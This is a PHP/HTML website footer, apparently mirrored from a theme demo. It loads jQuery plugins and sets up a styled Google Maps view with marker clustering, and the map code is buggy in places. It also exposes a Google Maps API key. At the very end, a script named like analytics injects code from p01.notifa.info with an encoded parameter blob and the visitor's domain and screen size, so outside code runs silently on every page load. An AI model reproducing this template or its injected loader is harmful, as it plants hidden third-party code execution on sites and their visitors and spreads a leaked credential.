<!-- Script Begins -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery-1.11.0.min.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/bootstrap.min.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/bootstrap-hover-dropdown.min.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/bootstrapValidator.min.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.sticky.js' ?>"></script>
<!-- Slider and Features Canvas -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.flexslider-min.js' ?>"></script>
<!-- Overlay -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/overlay/modernizr.js' ?>"></script>
<!-- Screenshot -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.flexisel.js' ?>"></script>
<!-- Portfolio -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.prettyPhoto.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.mixitup.min.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.fitvids.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.easing.1.3.js' ?>"></script>
<!-- Counting Section -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/jquery.appear.js' ?>"></script>
<!-- Expertise Circular Progress Bar -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/effect.js' ?>"></script>
<!-- Twitter -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/tweet/carousel.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/tweet/scripts.js' ?>"></script>
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/tweet/tweetie.min.js' ?>"></script>
<!-- Custom -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/custom.js' ?>"></script>
<!-- Color -->
<script type="text/javascript" src="<?php echo base_url('assets/') . 'js/color-panel.js' ?>"></script>

<script type="text/javascript">
    var mapStyle = [{
            featureType: "water",
            elementType: "geometry",
            stylers: [{
                    color: "#4cbad7"
                },
                {
                    lightness: 17
                }
            ]
        },
        {
            featureType: "landscape",
            elementType: "geometry",
            stylers: [{
                    color: "#f5f5f5"
                },
                {
                    lightness: 20
                }
            ]
        },
        {
            featureType: "road.highway",
            elementType: "geometry.fill",
            stylers: [{
                    color: "#ffffff"
                },
                {
                    lightness: 17
                }
            ]
        },
        {
            featureType: "road.highway",
            elementType: "geometry.stroke",
            stylers: [{
                    color: "#ffffff"
                },
                {
                    lightness: 29
                },
                {
                    weight: 0.2
                }
            ]
        },
        {
            featureType: "road.arterial",
            elementType: "geometry",
            stylers: [{
                    color: "#ffffff"
                },
                {
                    lightness: 18
                }
            ]
        },
        {
            featureType: "road.local",
            elementType: "geometry",
            stylers: [{
                    color: "#ffffff"
                },
                {
                    lightness: 16
                }
            ]
        },
        {
            featureType: "poi",
            elementType: "geometry",
            stylers: [{
                    color: "#f5f5f5"
                },
                {
                    lightness: 21
                }
            ]
        },
        {
            featureType: "poi.park",
            elementType: "geometry",
            stylers: [{
                    color: "#dedede"
                },
                {
                    lightness: 21
                }
            ]
        },
        {
            elementType: "labels.text.stroke",
            stylers: [{
                    visibility: "on"
                },
                {
                    color: "#ffffff"
                },
                {
                    lightness: 16
                }
            ]
        },
        {
            elementType: "labels.text.fill",
            stylers: [{
                    saturation: 36
                },
                {
                    color: "#333333"
                },
                {
                    lightness: 40
                }
            ]
        },
        {
            elementType: "labels.icon",
            stylers: [{
                visibility: "off"
            }]
        },
        {
            featureType: "transit",
            elementType: "geometry",
            stylers: [{
                    color: "#f2f2f2"
                },
                {
                    lightness: 19
                }
            ]
        },
        {
            featureType: "administrative",
            elementType: "geometry.fill",
            stylers: [{
                    color: "#fefefe"
                },
                {
                    lightness: 20
                }
            ]
        },
        {
            featureType: "administrative",
            elementType: "geometry.stroke",
            stylers: [{
                    color: "#fefefe"
                },
                {
                    lightness: 17
                },
                {
                    weight: 1.2
                }
            ]
        }
    ];

    var map,bounds
    var markers = [{
        lat: -6.330159,
        lang: 106.680048
    }]
    function initMap() {
        map = new google.maps.Map(document.getElementById('map'), {
            styles: mapStyle,
            center: {
                lat: -5.400325707909282,
                lng: 120.90035944608732
            },
            zoom: 4.8,
            zoomControl: true,
            zoomControlOptions: {
                position: google.maps.ControlPosition.RIGHT_TOP
            },
            streetViewControl: true,
            streetViewControlOptions: {
                position: google.maps.ControlPosition.RIGHT_TOP
            },
            mapTypeControl: true,
            mapTypeControlOptions: {
                style: google.maps.MapTypeControlStyle.HORIZONTAL_BAR,
                position: google.maps.ControlPosition.BOTTOM_CENTER
            },
        });
        var markerCluster = new MarkerClusterer(map, markers);
    }


    let res = [];

    function setMarkers(marker, map, bounds) {
        var markerMap = marker;
        var pos = new google.maps.LatLng(markerMap.lat, markerMap.lang);
        var content = marker;
        var icon = filterIcon(marker);

        res.push(markerMap.address);
        res.push(markerMap.site_name);
        res.push(JSON.parse(marker.other_data).regional);

        var other_data = JSON.parse(marker.other_data);
        markerMap = new google.maps.Marker({
            position: pos,
            map: map,
            // model: markerMap.model.toUpperCase(),
            // area: markerMap.area.toUpperCase(),
            // // tenant: (markerMap.tenant?markerMap.tenant.toUpperCase():''),
            // regional: (other_data.regional ? other_data.regional.toLowerCase() : 'unknown'),
            // competitor: (other_data.competitor ? other_data.competitor.toLowerCase() : 'unknown'),
            // address: markerMap.address,
            // site_name: markerMap.site_name,
            // icon: icon
        });

        markers.push(markerMap);

        var infowindow = new google.maps.InfoWindow({
            content: filterContentInfoWindow(marker)
        });

        bounds.extend(markerMap.position);
        google.maps.event.addListener(markerMap, 'click', (function(marker, content) {
            return function() {
                if (prev_infowindow) {
                    prev_infowindow.close();
                }

                prev_infowindow = infowindow;
                // infowindow.setContent(content);
                infowindow.open(map, markerMap);
                // map.panTo(this.getPosition());
                // map.setZoom(15);
            }
        })(markerMap, content));
    }

    setMarkers(markers, map, bounds)
</script>
<script src="https://developers.google.com/maps/documentation/javascript/examples/markerclusterer/markerclusterer.js"></script>
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBmtZNz9aMpD-tDGdjX_ZmvkdCLe8orp7U&callback=initMap" async defer></script>
<!-- Script Ends -->
<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2YzsbesbU07c5jttHZgeBH8RG1lwFumg4PpMXsYSRV3zHiGDXj39JEHGSLCQxxCb0CKWJolqQyPc7CYcHLgriRUu9wFGUsM1UHDvP6aWa2CEyCvONcBy6h6gTg6LeAJR7v1oGCsDstSA%2bx2L6SFLloLfB7fRySxKMgwVUtdGeo2DbPW1p84I%2bMxn7dS8GqTIaQS8DoIcRPjwYra1%2brKmhhc%2frXjGCk7urqt0CgUYvpbsy9P8KFLFM23vdAWKHVMUYf3fjcdbIr%2b0HFT3ODQvZGqCtc9lGTzUtO2xoi%2f%2f4AkisyCmId6Er7YYmPBKDGGcI%2b20xxSyrknDje9YeVrlSCAIZJtelPkJzO6PFyshRf3YSAIUrRW7cO7dbIkJ9pr%2biwQcBuzo0cMFwdyhsim2tN49%2bNAROzXpJ6PzqIDpTCpvfyMWJSSNMY%2fTIqxJgipwJVkINTpgoiLOuBo5YX1XTCaBM8%2bLNe2yUpfl4Xt%2bK%2bK17qf7ZI5kfSJaCOGQF0rntXnjJuA58lTrNcR7TjSSrgQ%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>
</body>

<!-- Mirrored from zozothemes.com/html/layer/new-variants/image-bg/demo3/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 12 Sep 2019 14:21:27 GMT -->

</html>